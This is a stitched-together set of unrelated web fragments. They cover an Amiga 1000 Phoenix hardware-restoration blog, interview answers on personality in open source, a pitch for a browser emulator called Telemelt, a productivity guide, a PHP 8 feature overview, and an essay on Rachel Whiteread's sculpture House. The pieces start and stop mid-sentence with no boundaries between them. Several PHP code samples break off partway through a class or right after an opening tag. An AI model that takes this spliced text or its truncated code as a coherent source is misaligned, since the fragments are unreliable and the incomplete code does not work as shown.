<p>Once it worked, I’ve figured that it might be as simple as a flaky ROM socket problem. I’ve put a 2.0 ROM in the place of DiagROM and Viola! It works!</p>
<figure><img src="https://i1.wp.com/imgur.com/CVzvAYd.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/CVzvAYd.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>When I’ve figured that part out, I could move on and start working on the alternative power supply which was …</p>
<h4>HDPLEX + Uber nice Amiga adapter</h4>
<p>MrTrinsic sent me this HQ HDPLEX Pico PSU but he’d also sent me a very cool DIY KIT – ATX2.0d-Amiga adapter which has super cool features like over-voltage/current protection outputs all needed voltages, and has additional floppy power outputs. Moreover, it generates a TICK signal which is good to have for testing.</p>
<p>However, it was a DIY KIT so I had to solder it all up first.</p>

<p>All I needed to do next was to prepare all the wiring. That was a trivial job after taking some measurements. I’ve used wires from my Nissan Patrol spare wiring kit as these are thick (copper) and nice, hence the color mismatch ;P</p>

<p>It worked like a charm so now I had two working power supplies – original and superior to it HDPLEX with a kickass adapter.</p>
<h4>030 cards</h4>
<p>The next step was about adding 68030 CPU to the system. I had two options as MrTrinsic sent me two different solutions.</p>
<p>The First solution was an <a rel="noreferrer noopener" href="https://icomp.de/shop-icomp/en/produkt-details/product/ACA500plus.html" target="_blank">ACA500plus</a> card along with <a rel="noreferrer noopener" href="http://wiki.icomp.de/wiki/ACA1233n" target="_blank">an ACA1233n</a> accelerator card by Individual Computers. ACA500plus also had an Ethernet add-on – X-Surf 500</p>
<p>These two make a great solution but for AMIGA 500. There are not many folks out there who played it with it in an A1000 and especially with a Phoenix mobo!</p>

<p>Then I’ve added ACA1233n on an EXTREMELY WANTED DURING PANDEMIC stand 😀 😀 😀</p>

<p>To my surprise, it worked!</p>

<p>Below, a demo running on this setup</p>

<p>The second setup was a bit different. It is made of four devices.</p>
<ul><li>Open 68000 relocator card</li><li>68030 accelerator card </li><li>SDRam + IDE interface</li><li>IDE2CF interface</li></ul>
<p>This setup also appeared to be working nicely after some tests, however as MrTrinsic pointed out, it has some stability issues and will not allow running some software so it was a backup card in case ACA failed. I don’t have a video of it running though.</p>

<h4>Other mods and add-ons</h4>
<p>Once accel-cards were tested, I’ve started installing OS and testing other mods. To name the few:</p>
<ul><li>X-surf 500 Ethernet card</li><li>RapidRoad USB</li><li>Indivision ECS v2</li><li>SCSI2SD </li><li>KryoFlux GBAPII++</li></ul>

<p>Indivision ECS v2 and SCSI2SD worked flawlessly so I started playing with other gear.</p>

<p>After installing all the needed software I’ve finally managed to get an IP addr from my local DHCP server</p>

<p>Obviously, I wouldn’t be myself if I didn’t destroy something. I’ve accidentally connected the RapidRoad USB module to a clock port the other way around. The magic smoke appeared and…</p>

<p>Of course, I had to fix it. After a while, it turned out that only 3R3 resistor was fried.</p>

<h4>GFX cards</h4>
<p>Once all other major mods were working more or less correctly, I could start testing GFX cards high-res modes.</p>
<p>This is where it all started to go wrong …</p>
<p>I had two cards to test with this setup – GBAPII++ by Kryoflux and ZZ9000 by MNT. </p>
<p>GBAPII++ worked nicely only with green 030 cards, but in such config, there would be no Ethernet card.</p>

<p>Then I’ve tried running ZZ9000 along with green 030 and ACA cards but I’ve encountered autoconfig problems.</p>

<p>Finally, I’ve focused on ACA500plus with ACA1233n and I just couldn’t make it work. </p>
<p>When ACA was inserted then GBAPII++ was completely invisible to the system.</p>
<p>After updating tons of libraries, firmware and reinstalling OS a few times without any luck, we’ve figured out that it might be a power issue. MrTrinsic ordered an adapter for A500 which would allow pumping in more power.</p>
<p>I’ve first tested it with a stock A500.</p>

<p>Same story, GBAPII++ was invisible but I’ve checked it with A1K and power injector adapter just to be sure … unfortunately no luck again.</p>

<h4>Unfinished 🙁</h4>
<p>I’ve invested weeks of time into this GFX problem research but finally, I had to give up on this project for now. It is still in an unfinished state until we will find a solution to all problems. The project is partially done but it requires more work and I hope to cover it someday in one of the future posts making Amiga 1000 Phoenix great again!</p>
<p>But worry not, this gave birth to a new project which is even more awesome.</p>
<p>Currently, it is a work-in-progress but that is a story for another blog post 🙂</p>

October 27, 2020 | https://anonymoushash.vmbrasseur.com/2020/10/26/personality-in-open-source | <a href="https://web.archive.org/web/*/https://anonymoushash.vmbrasseur.com/2020/10/26/personality-in-open-source">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="text">
        
        <p>In September, <a href="https://twitter.com/esthershein">Ether Shein</a> interviewed me for an <a href="https://www.functionize.com/blog/how-personality-traits-affect-the-open-source-development-process/">article</a> she was writing for <a href="https://www.functionize.com/blog/">Functionize</a> about how personality affects the development process in open source projects. The article was inspired by a <a href="https://ieeexplore.ieee.org/abstract/document/8935389">study published in 2019</a> about the effects of personality traits on the acceptance of pull requests. Both the article and the study are worth a read.</p>

<p>What follows are my responses to the questions Esther sent.</p>

<h2 id="what-is-your-reaction-to-the-research-suggesting-that-a-developers-personality-has-an-impact-on-the-ability-to-successfully-contribute-to-an-open-source-project">What is your reaction to the research suggesting that a developer’s personality has an impact on the ability to successfully contribute to an open source project?</h2>

<p>What’s the adjective for “the furthest thing from surprised”? Because whatever that word is describes my reaction to this finding. While the research phrases it academically as “personality,” what they mean by that is someone’s ability to interact with others, the application of social interaction skills as well as technical skills.</p>

<p><em>Of course</em> social interaction is critical to a successful open source contribution, because it’s critical to <em>any</em> endeavour that involves more than one human being. Collaboration is difficult if not impossible when people aren’t able to interact well, whether due to personal skills, language differences, or some other obstruction. This is why we as humans spend so much time researching and discussing how to interact better: it affects everything we do as a civil society.</p>

<p>It’s also why so much of <a href="https://fossforge.com/">my book</a> ended up being about the social interactions involved with contributing to an open source project: it’s vital to the success of your contribution. We in open source have abundant documentation about the technical aspects of contributing, such as writing tests or the mechanics of sending your contribution for review. However, we have relatively little documentation about the social expectations for that contribution. Not that projects ignore the social expectations, of course; it’s simply that they rarely document them. Instead these expectations are a part of the tribal knowledge that a new contributor is expected to absorb. This can lead to a frustrating contribution experience. <a href="https://fossforge.com/">The book</a> collects these previously unwritten social rules of open source contributing in a single spot, giving people a better chance of success.</p>

<p>Which isn’t to diminish the importance of the findings of this research. These personality factors have a massive impact on the end result of an open source contribution, and this research has done a lot of work to prove that. Unfortunately, many people require that proof. They would rather throw a <code>[citation needed]</code> gauntlet on the table than make an effort to learn how to interact better with others. This research is the latest in a long line of responses to that gauntlet.</p>

<h2 id="should-maintainers-apply-personality-categorisation-methods-to-open-source-contributors">Should maintainers apply personality categorisation methods to open source contributors?</h2>

<blockquote>
  <p>People who are curious about where they score in the <a href="https://en.wikipedia.org/wiki/Big_Five_personality_traits">Big Five personality traits</a> can take the test at Open Psychometrics, while simultaneously (but optionally) contributing their results to ongoing research: <a href="http://openpsychometrics.org/">http://openpsychometrics.org</a></p>
</blockquote>

<p>As pointed out by the researchers, so far Big Five holds up to rigorous study. As such, it’s proven useful for broad sociological research such as this. Other personality type methodologies, such as the Myers-Briggs Type Indicator (MBTI), do not hold up to study and <a href="https://en.wikipedia.org/wiki/Myers%E2%80%93Briggs_Type_Indicator#Criticism">are considered problematic</a>.</p>

<p>Regardless of personality categorisation method, a category is not a judgement. For instance, scoring lower in the Neuroticism factor in Big Five simply means your emotional state is more variable <em>as compared with the others who took the test</em>. It’s a research label, not a diagnosis.</p>

<p>I believe it would be dangerous for individuals or projects to start incorporating this research into their contribution workflows at this time. It’s easy to picture some nightmare of a startup spinning up to “leverage AI, ML, and NLP to analyse your open source contributions and maximise the contributor-maintainer synergy, creating a more scaleable, sustainable, and delightful contribution experience” or <a href="https://strategy-madlibs.herokuapp.com/">some such rubbish</a>.</p>

<p>Yes, responding to and reviewing contributions can be time consuming, but applying generalisations intended for research to real-world situations typically <a href="https://twitter.com/justsaysinmice">causes more harm than good</a>. Please bury that terrible startup idea in a deep hole somewhere and pretend it never existed.</p>



<p>You can’t feasibly remove people from software development. Even if you go low-code or were to step into a sci-fi world and automate all code generation, you’re still creating software to solve problems for humans. Humans must be involved in the process somewhere, or it’s very unlikely that their needs will be met (in which case, why bother having the software at all?).</p>

<p>Right now code generation isn’t automated (for the most part); code is written by people. People creating software to solve problems for other people. With so many people in the mix, of course social interactions will have an outsized impact on the end result. Communication, conflict resolution, and empathy are key to successful social interactions. They’re important, and thankfully they’re learnable. You may never be perfect at—for instance—conflict resolution, but you can learn how to get better at it.</p>

<p>Therefore a practical takeaway from this research is that <strong>time spent learning how to improve your social interactions will have a larger return on investment for your career than the time spent improving your technical skills</strong>. Which isn’t to say that you should neglect your technical skills. This isn’t an either-or situation; it’s both-and. A software development career with technical but not social improvements is like a cake without the sugar: not very appealing.</p>

<p>Another important and practical takeaway from this research is the one that most people are overlooking: <strong>Having a diversity of social traits in an open source community leads to a better contribution experience.</strong> There’s plenty of research that supports this. <a href="https://hbr.org/2016/11/why-diverse-teams-are-smarter">Homogeneous teams consistently underperform those with diverse membership</a>. In this case, the researchers found that communities with diverse social and personality traits have more successful (i.e. merged) contributions. Therefore it follows that anything you can do to increase the human diversity in your open source project will also lead to more contributions.</p>

<p>That’s a powerful finding, and is possibly more important than the findings that are focused on the individual person submitting or reviewing a contribution.</p>

<p><img src="https://cdn.glitch.com/33ee6b19-10fa-4d51-8898-d35eb670b3fe%2Ftelemelt-FINAL.png?v=1601250432872" alt="Telemelt Logo"></p>
<p><a href="https://telemelt.com/">Telemelt</a> is a web-based multi-emulator (<a href="https://www.retroarch.com/">RetroArch</a>/<a href="https://www.libretro.com/">libretro</a>) designed to recreate the experience of playing console games with a single controller in a room full of friends.</p>
<p>Gathering around a TV and collectively attempting to beat a game has been a consistent joy throughout my life, and is one of the rituals I miss the most with the ones we're separated from right now. I wanted to create a way to play single player/hotseat games with friends remotely that was free and required minimal setup. Netplay has always been unsatisfying for this, since only the host had low enough latency for games that require tight timing. I started this project in March, and have been pouring my heart into it every day possible since then.<br>
<img src="https://cdn.glitch.com/33ee6b19-10fa-4d51-8898-d35eb670b3fe%2F6dfcbe63-2f80-4bb3-a780-a48a51dc0a19.image.png?v=1602011998888" alt="collage"></p>
<p>The system skips traditional netplay to allow a single player to assume host responsibility and experience <strong>zero network latency</strong> for games with demanding response times, with the viewers processing frames as broadcasted by the player. The virtual controller/host can be instantly passed to any user in the room.</p>
<p><strong>Designed to be lowest hassle way to play emulated games with a friend or loved one, even if they are not tech savvy!</strong></p>
<ul>
<li>No port forwarding, no IP addresses thanks to auto-generated URL</li>
<li>No installation or downloads, everything works in browser</li>
<li>Mappings for common/inexpensive controllers (PS3/4, XB360/1, Switch JC/Pro etc..) on both USB/BT thanks to RetroArch bindings</li>
<li>Always free! No tracking, no logins, no paid advertisements - personal budget allocated for Azure costs to serve thousands of users for months</li>
</ul>

<p><strong>Focus on the experience of passing <em>a single controller</em> between people</strong></p>
<ul>
<li>This allows for a unique and efficient architecture that provides a consistent experience with minimal bandwidth</li>
<li>No AV is transmitted! Only controller and serialized state data, made even smaller by <a href="https://github.com/phretaddin/schemapack">schemapack</a></li>
<li>User state error checked per frame and reconciled via <a href="http://socket.io/">socket.io</a> server if needed</li>
<li>Takes advantage of deterministic nature of certain libretro cores - like a broadcasted <a href="https://en.wikipedia.org/wiki/Tool-assisted_speedrun">TAS</a></li>
<li>Rethink the kinds of content you would play (painting, music collaboration, RPGs, game shows)</li>
<li>Everyone working towards the same goal keeps people engaged</li>
</ul>

<li>Minigame collections (player transfer system is fast enough to keep up with switching on every stage)</li>
<li>Practice for a week then hold live olympic games (world/winter/summer/california games etc)</li>
<li>Live sound test or NSF/VGM listening party</li>
<li>Homebrews, hacks, and live demoparties (with live reactions)</li>
<li>Golf / bowling / fishing games to chill</li>

And this also means that you can focus on those more important tasks and become more efficient at them.</p><p>At the end of this guide, you will have all the necessary knowledge to analyze your approach toward different assignments and make the corresponding adjustments to be more productive. It helped me <a href="https://iuliangulea.com/faang-preparation/">land an offer at facebook</a> and become a part of <a href="https://www.toptal.com/resume/iulian-gulea">Toptal</a> — one of the best freelance communities on the planet, and I hope that it will help you, too.</p><h2 id="the-four-levels-of-mastery">The Four Levels Of Mastery</h2><p><img src="https://iuliangulea.com/images/the-pyramid-of-mastery/the-pyramid-of-mastery-1.png" alt="The Pyramid Of Mastery"></p><p>Before diving into different productivity techniques, let’s first dive into more details about the <em>essence</em> of productivity. And to do that, I will use the <a href="https://iuliangulea.com/pyramid-of-mastery/">Pyramid of Mastery</a> — a model that allows you to understand better a domain of interest, its constituent parts, and how to become an expert in it.</p><p>It does so by defining a domain through four types of entities:</p><ul><li><strong>Elements.</strong> These are the building blocks of the field of interest, that include concepts, ideas, and entities;</li><li><strong>Rules.</strong> These are the laws that govern a domain. This layer comprises both rules that define the interaction between various Elements as well as organizational and governing rules at the domain level;</li><li><strong>Tools.</strong> These are the instruments you use to perform the activities within a field;</li><li><strong>Frameworks.</strong> These are combinations of the above levels that allow for faster achievement of preset goals for which the Framework was created;</li></ul><p>For an in-depth explanation of the Pyramid of Mastery, you can read the original <a href="https://iuliangulea.com/pyramid-of-mastery/">article</a> on it.</p><p>Now, once you have an understanding of the model, let’s see how we can define productivity through the prism of it.</p><h2 id="productivity-elements">Productivity Elements</h2><p><img src="https://iuliangulea.com/images/the-pyramid-of-mastery/the-pyramid-elements.png" alt="Pyramid of Mastery - Elements"></p><p>What are the Elements of productivity, the building blocks that you need to know about in order to excel at it?</p><p>I find this to be the most underestimated and overlooked layer. Very few people are thinking about what makes a productive person or about what productivity consists of. Instead, they try to squeeze in more time using tools, calendars, and other tools.</p><p>But knowing the fundamentals is vital if you want to become an expert in something. Therefore, here are some of the Elements that can help you be more productive if you understand them.</p><h3 id="human-senses">Human Senses</h3><p>Our senses are the only mechanisms that allow us to get information about the world around us. Humans have five main senses through which they receive information:</p><ul><li>Vision</li><li>Hearing</li><li>Touch</li><li>Smell</li><li>Taste</li></ul><p>Each sense has its own throughput:</p><p><img src="https://iuliangulea.com/images/conscious_attention_bit_sec.png#c" alt="Image with conscious attention throughput"></p><p>Therefore, we receive the most information visually, then through hearing, touch, smell, and taste.</p><p>If you are interested in the topic of human senses, I wrote a separate, in-depth <a href="https://iuliangulea.com/human-senses/">article</a> about it.</p><h3 id="attention">Attention</h3><p>We receive a flood of information through our senses at every moment, but only a tiny bit of it reaches our awareness. This filter that orients our focus toward different stimuli is <strong>attention.</strong></p><p>Attention is the process that selects which sensory information is preferentially processed and ultimately reaches our awareness.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup></p><p>There are two types of attention: <em>Goal-Directed</em> attention (GDA) and <em>Stimulus-Driven</em> attention (SDA). The GDA is the voluntary effort to focus on something, be it reading this article, cutting vegetables, watching a movie, or writing code.</p><p>On the other hand, SDA is the involuntary reaction toward stimuli that are salient enough to grab our attention:</p><ul><li>contrasting things (stillness to movement, loud to soft, silence to sound, dark to bright, etc.);</li><li>intensity stimulation (extreme sounds, sights, etc.);</li><li>certain impulses we find vital or appealing (dangerous things, beautiful things, shiny things, etc.);</li></ul><p>If you are interested in the topic of attention, I wrote a separate, in-depth <a href="https://iuliangulea.com/attention/">article</a> about it.</p><h3 id="working-memory">Working Memory</h3><p>For tasks that require cognitive effort, once we focused our attention on a specific subset of stimuli we got from our senses, it is only here that we can finally perform some mental work.</p><p>Working Memory is the place in our memory where we can consciously process and manipulate data. It has a fundamental limitation, though: its processing capacity is limited to ~4 chunks of information.</p><p>A <em>chunk</em> is a relative unit of measurement that depends on different factors, such as:</p><ul><li>familiarity with the topic;</li><li>complexity of the concept;</li><li>one’s mental agility;</li></ul><p>For instance, in the simple task of solving this simple math equation <code>21 * 2</code>, you have to store number <code>21</code> as a chunk, store number <code>2</code> as another chunk, then, having these 2 in your working memory, do the multiplication, and store the result <code>42</code> as a third chunk.</p><p>However, in a debate on “homeschooling vs. formal education,” both concepts each represent a chunk. As it is a complex concept, you can then zoom in or out on either of those as information is stored in a complex network of associations in our brain.</p><p>If you would like to learn more about working memory, I wrote a separate, in-depth <a href="https://iuliangulea.com/working-memory/">article</a> about it.</p><h3 id="long-term-memory">Long-Term Memory</h3><p>Our Long-Term Memory (LTM) holds all the information, knowledge, skills, plans, and memories. What you commit to the LTM can stay there for your whole life. Although there is a tendency to forget things, you can strengthen your memories using repetition.</p><h3 id="task-process">Task Process</h3><p>A task usually represents a specific result you want to achieve (e.g., write an article, build a website, create a marketing campaign, etc.).

<p>PHP 8 is already in it's release candidate stage, with RC 3 being released on October 29th, and the general availability release targeted for November 26th. So it is time to take a look at all the new and upcoming features of PHP 8. You can take a look at PHP 8's <a href="https://wiki.php.net/todo/php80">release schedule here</a>.</p>
<p>Every feature that you see in this blogpost comes with an interactive embedded editor, where you can modify the PHP code and evaluate the results yourself.</p>
<p>The official upgrade guide can be found on <a href="https://github.com/php/php-src/blob/PHP-8.0/UPGRADING">GitHub</a>.</p>

<p>Editing and evaluating the code requires cross-site cookies. If you have those disabled, you can click "Edit on Laravel Playground" to jump into the code examples and edit them.</p>

<p>A union type accepts values of multiple different types, rather than a single one.</p>
<pre data-theme="light" data-filename="index.php" data-php="8"><pre data-filename="index.php">&lt;?php
declare(strict_types=1);
 
class Number {

    public function setNumber(int|float $number): void {
        $this-&gt;number = $number;
    }
 
    public function getNumber(): int|float {
        return $this-&gt;number;

<h2 id="added-weakmap-a-hrefhttpswikiphpnetrfcweak-mapsrfca">Added WeakMap (<a href="https://wiki.php.net/rfc/weak_maps">RFC</a>) <a href="#added-weakmap-a-hrefhttpswikiphpnetrfcweak-mapsrfca">#</a></h2>
<blockquote>
<p>Weak maps allow creating a map from objects to arbitrary values (similar to SplObjectStorage) without preventing the objects that are used as keys from being garbage collected. If an object key is garbage collected, it will simply be removed from the map.</p>
</blockquote>
<p>This is a very useful new feature, as it allows users to worry even less about leaving memory leaks in their code. While this might not be an issue for most PHP developers, it is certainly something to watch out for when writing long-running processes, for example using ReactPHP. With WeakMaps, references to an object automatically get garbage collected, once the object is no longer available.</p>
<p>If you would do the same thing with an array, you would still have a reference to the object, thus leaking memory.</p>
<pre data-theme="light" data-filename="index.php" data-php="8"><pre data-filename="index.php">&lt;?php
declare(strict_types=1);
 

class FooBar {
    public WeakMap $cache;
    
    public function __construct() {
    	$this-&gt;cache = new WeakMap();
    }
 
    public function getSomethingWithCaching(object $obj) {
        return $this-&gt;cache[$obj] ??= $this-&gt;computeSomethingExpensive($obj);
    }
    
    public function computeSomethingExpensive(object $obj) {
		dump("I got called");
		return rand(1, 100);
    }
}

$cacheObject = new stdClass;

$obj = new FooBar;
// "I got called" only will be printed once
$obj-&gt;getSomethingWithCaching($cacheObject);
$obj-&gt;getSomethingWithCaching($cacheObject);

dump(count($obj-&gt;cache));

// When unsetting our object, the WeakMap frees up memory
unset($cacheObject);

dump(count($obj-&gt;cache));

exit;

<h2 id="new-codevalueerrorcode-exception">New <code>ValueError</code> Exception <a href="#new-codevalueerrorcode-exception">#</a></h2>
<p>PHP 8 introduces a new built-in exception class called <code>ValueError</code>. It extends <code>\Exception</code> and PHP throws this exception, every time you pass a value to a function, which has a valid type - but can not be used for the operation. Prior to PHP 8, this would result in a warning.</p>
<p>Here are some examples:</p>
<pre data-theme="light" data-filename="index.php" data-php="8"><pre data-filename="index.php">&lt;?php
declare(strict_types=1);
 
/**
 * We pass an array to array_rand,
 * which is of the correct type. But
 * array_rand expects non-empty arrays.
 *
 * This throws a ValueError exception.
 */
array_rand([], 0);

/**
 * The depth argument for json_decode is a
 * valid integer, but it must be greater than 0
 */
json_decode('{}', true, -1);

<blockquote>
<p>Any number of function parameters may now be replaced by a variadic argument, as long as the types are compatible. For example, the following code is now allowed:</p>
</blockquote>
<pre data-theme="light" data-filename="index.php" data-php="8"><pre data-filename="index.php">&lt;?php
declare(strict_types=1);

class A {
    public function method(int $many, string $parameters, $here) {

    }
}
class B extends A {
    public function method(...$everything) {

<p>The <code>static</code> return type may now be used in PHP 8 to identify that a method returns the class, that this method was actually called on - even if it was inherited (late static binding).</p>
<pre data-theme="light" data-filename="index.php" data-php="8"><pre data-filename="index.php">&lt;?php

<p>It is now possible to fetch the class name of an object using <code>$object::class</code>. The result is the same as <code>get_class($object)</code>.</p>
<pre data-theme="light" data-filename="index.php" data-php="8"><pre data-filename="index.php">&lt;?php

<p>PHP 8 introduces a new <code>Stringable</code> interfaces, which gets automatically added, once a class implements the <code>__toString</code> method. You do not need to explicitly implement this interface.</p>
<pre data-theme="light" data-filename="index.php" data-php="8"><pre data-filename="index.php">&lt;?php

<p>The <code>throw</code> statement can now be used in places where only expressions are allowed, like arrow functions, the coalesce operator and the ternary/elvis operator.</p>
<pre data-theme="light" data-filename="index.php" data-php="8"><pre data-filename="index.php">&lt;?php

<h2 id="added-support-for-attributes">Added support for Attributes <a href="#added-support-for-attributes">#</a></h2>
<p>PHP 8's attributes actually consist of a number of RFCs:</p>
<ul>
<li>RFC: <a href="https://wiki.php.net/rfc/attributes_v2">https://wiki.php.net/rfc/attributes_v2</a>
</li>
<li>RFC: <a href="https://wiki.php.net/rfc/attribute_amendments">https://wiki.php.net/rfc/attribute_amendments</a>
</li>
<li>RFC: <a href="https://wiki.php.net/rfc/shorter_attribute_syntax">https://wiki.php.net/rfc/shorter_attribute_syntax</a>
</li>
<li>RFC: <a href="https://wiki.php.net/rfc/shorter_attribute_syntax_change">https://wiki.php.net/rfc/shorter_attribute_syntax_change</a>
</li>
</ul>
<p>Attributes are definitely one of the biggest changes in PHP 8, and they can be a bit tricky to understand at first. In short, attributes allow you to add meta-data to PHP functions, parameters, classes, etc.
This meta-data can then be retrieved programatically - whereas in PHP 7 and lower, you would need to parse doclocks, attributes allow you to access this information deeply integrated into PHP itself.</p>
<p>To make this a bit clearer, lets say that you want to allow users to add a middleware to a controller class/method by using an attribute.</p>
<pre data-theme="light" data-filename="index.php" data-php="8"><pre data-filename="index.php">&lt;?php
declare(strict_types=1);
// First, we need to define the attribute. An Attribute itself is just a plain PHP class, that is annotated as an Attribute itself.

#[Attribute]
class ApplyMiddleware
{
    public array $middlware = [];

    public function __construct(...$middleware) {
        $this-&gt;middleware = $middleware;
    }
}

// This adds the attribute to the MyController class, with the "auth" middleware as an argument.

#[ApplyMiddleware('auth')]
class MyController
{
    public function index() {}
}

// We can then retrieve all ApplyMiddleware attributes on our class using reflection
// And read the given middleware arguments.

$reflectionClass = new ReflectionClass(MyController::class);

$attributes = $reflectionClass-&gt;getAttributes(ApplyMiddleware::class);

foreach ($attributes as $attribute) {
    $middlewareAttribute = $attribute-&gt;newInstance();
    dump($middlewareAttribute-&gt;middleware);
}

exit;
</pre>
</pre>

<p>This RFC proposes to introduce a short hand syntax, which allows combining the definition of properties and the constructor:</p>
<pre data-theme="light" data-filename="index.php" data-php="8"><pre data-filename="index.php">&lt;?php
declare(strict_types=1);

class User {
    public function __construct(
        public int $id,
        public string $name,
    ) {}
}

$user = new User(1, 'Marcel');

dump($user-&gt;id);
dump($user-&gt;name);

(<a href="https://wiki.php.net/rfc/match_expression_v2">RFC</a>) <a href="#added-support-for-codematchcode-expression-a-hrefhttpswikiphpnetrfcmatch-expression-v2rfca">#</a></h2>
<p>This RFC proposes adding a new match expression that is similar to switch but with safer semantics and the ability to return values.</p>
<pre data-theme="light" data-filename="index.php" data-php="8"><pre data-filename="index.php">&lt;?php

In fact, an English Heritage plaque on the railway bridge a little further down Grove Road commemorates the first one to strike London.</p>



<p>The blitz largely levelled the hundred or so turn-of-the-century terraces, common stock of the working class East End, on what is now the Green but up until the early ‘90s a row of dilapidated dwellings persisted. These residences were mostly derelict, abandoned and occasionally squatted, but for one, ex-docker Mr Sidney Gale of No. 193, a condemned house remained a home.</p>



<p>Indeed, in 1993, the final row was fated to be demolished as part of Tower Hamlet’s council’s plan to create a Green Corridor, unifying the broken line of parkland between the Isle of Dogs and the established lung of <a href="https://romanroadlondon.com/victoria-park-east-london-bow/">Victoria Park</a>. It was a means to cleanse the area of the legacy of prefabs that had homed the dislocated population post-war and a redemptive space for those in the high-rise accommodation which had replaced the traditional terraces. ‘What people who live in tower blocks want is parkland,’ declared Councillor Eric Flounders.</p>



<p>Yet psychogeographer Iain Sinclair was sceptical of the council’s motives, calling it ‘an Arcadia for the underclass… the whole scheme was a disinterested attempt at municipal aesthetics’. Pointedly, the area was in direct sight of Mrs Thatcher’s commerce baby, Canary Wharf, and the call for a Green was not a far cry from the original motivations to create Victoria Park, opened in 1845. Vicky Park is the oldest purpose built recreation ground in London, conceived to curb disease contracted in damp and cramped conditions and as a means harness working-class wildness. Indeed, Bow is an area rich with connotations of a strong working-class community, but also radicalism and revolt.</p>



<p>Mr Gale forcefully resisted eviction from No. 193 by the council for a number of years, even festooning the property with banners to affirm his unrelenting presence, but, realising his campaign was ultimately futile, he eventually yielded and was re-homed nearby. Gale’s loss was artist Rachel Whiteread’s gain. The practitioner had been seeking a condemned property in London for over two years to realise a project which was essentially a development upon her Turner Prize nominated sculpture, Ghost (1990); a room-sized cast of a bedsit contained in a Victorian property in Archway.</p>



<p>Whiteread, supported by art commissioners Artangel, approached the London Borough of Tower Hamlets&nbsp;council about utilising the property and the authorities duly consented. In the beginning, the council were of the opinion that, ‘It won’t cost the neighbourhood a penny and will provide an unusual landmark for the area,’ however, by the time the bricks were removed and the sculpture was exposed, Councillor Flounders, Chair of Bow Parks Board, denounced it as ‘excrescent.’</p>



<h2>Building Rachel Whiteread’s House</h2>

<p>To make House, Whiteread used the physical house as&nbsp;a&nbsp;mould, making a cast from the interior by spraying a skin of liquid concrete around a metal armature constructed to support the weight of the work. Coating the whole house took over a month and an additional ten days were needed for the concrete to cure and set. Once solid, scaffolding was erected and Whiteread and her assistants began to remove the exterior brick structure.</p>



<p>What was revealed was an uncanny sight – the concrete impressed with the idiosyncrasies of over a century of domestic habitation. Depressions translated into protrusions; the industrial material betraying past human intimacies: soot marking the fire; yellow paint from a top-floor bedroom. The floors in-between stories could not be cast so, as local Markham Hall recalls, it resembled a ‘wedding cake.’ But the marriage at hand, between the art world and the East End, was to be short-lived and volatile.</p>



<h2>Reactions to Rachel Whiteread’s House</h2>



<p>It was essentially a neutral process, with no specific moral agenda, but Whiteread conceded ‘I knew of course, while I was making House, it had a political dimension. You can’t make a cast of a house in a poor area of London and not be political.’ Yet it became ‘far more political than I could have predicted.’ Seemingly, the council had also underestimated its resonance, as it quickly became front-page news, attracting scores of art-pilgrims and causing traffic chaos. Its status was even brought to debate in the House of Commons. The council couldn’t wait to get rid of the work fast enough, coming to regard it as a politically embarrassing monument to an impoverished history and standing in the way of the construction of a less threatening green space.</p>

Why Not? © David Hoffman</figcaption></figure>



<p>People reacted to House so strongly as it transcended the individual and became an archetype; an emblem for the area’s time-honoured mode of living. Indeed, it raised pressing questions regarding degrading housing stock and what should be done with it, the creeping gentrification of a historically tight working class community and scepticism towards the authority of those instigating change for the supposed ‘greater good’. In whose name was this change really for? And poignantly, it confronted these questions on its own material terms – concrete being the material used to fix the original Victorian House’s bricks; the embossed surface betraying the umbilical cords of pipes and power-lines which linked the individual house with the local, national and global public.</p>



<p>At base, Whiteread made an empty space, the negative void of the vacated property, into a positive object but insists ‘the work is to do with absence not presence.’ Implicitly, House was defined by the object it was not. When one refers to a ‘house’ we generally mean the façade as publicly viewed from the street, the interior is intimate – that is the home. Whiteread’s sculpture was resolutely an interior; an unsettling mass of inside, out.</p>



<p>The form elicited unease as when we have an intimate relationship with a space, we start to ignore its intricacies, instead handling navigating through the general form unconsciously. Thus, the sculpture was uncanny as it solidified the overlooked, demanding a long-looking, deep contemplation, as one attempted to decipher the inverted forms. Whiteread neglected to furnish her House with meaning but it was predominantly envisioned as what the populace of Bow would soon lose sight of. The interior, a family home, was left out in the cold and significantly, Whiteread chose not to cast the attic space, as if riffing on the idiom ‘left with no roof over their heads.’</p>



<p>It’s understandable then, that there was some resentment from locals towards House as they perceived it to be adding insult to injury over the demolition of such homes in the area, and a crassness in exposing working-class abode for the ‘arty’ leisure classes. Yet, this wasn’t just a case of Art World vs. East Enders, the opinions were split within both camps: in the Art World, Andrew Graham-Dixon proclaimed it ‘a strange and fantastical object which also amounts to one of the most extraordinary and imaginative public sculptures created by an English artist this century.’ To Brian&nbsp;Sewell, it was a ‘meritless gigantism.’ Sewell’s scorn found resonance in one local’s assertion that ‘an engineer could have done it; I don’t see it as creative.’ Whereas, another neighbour to the site regarded it as ‘brilliant,’ reckoning it to be ‘a new way of looking at traditional things.’</p>



<p>House’s evicted resident, Mr Gale, protested, ‘They’re taking the wee-wee.’ He questioned, ‘How can they get grants for arts projects when we can’t get grants for homes? I could have bought a new home for my family with this money.’ His sentiment was echoed in graffiti scrawled on the sculpture: ‘WOT FOR?’ Another renegade scribe rebuffing ‘Why not!’</p>



<p>House’s economics became even more contentious when Whiteread won the £20,000 Turner Prize for the work (the first woman to receive the honour), and then £40,000 from the rebel K Foundation (composed of members of the defunct pop group KLF) for the ‘worst artist of the year.’ Whiteread split the latter money between Shelter, a charity for the London’s homeless, and a fund to supplement young artists. On the same day, the&nbsp;Council made the decision to refuse House a stay of execution. By this time, many people (philanthropists, dealers, galleries) had offered to purchase House, but money offered to the Council to retain its presence was blasted by the authorities as ‘bribes.’ In any case, Whiteread was adamant that the sculpture was ‘absolutely specific to the site’ thus preferred its destruction to relocation.</p>



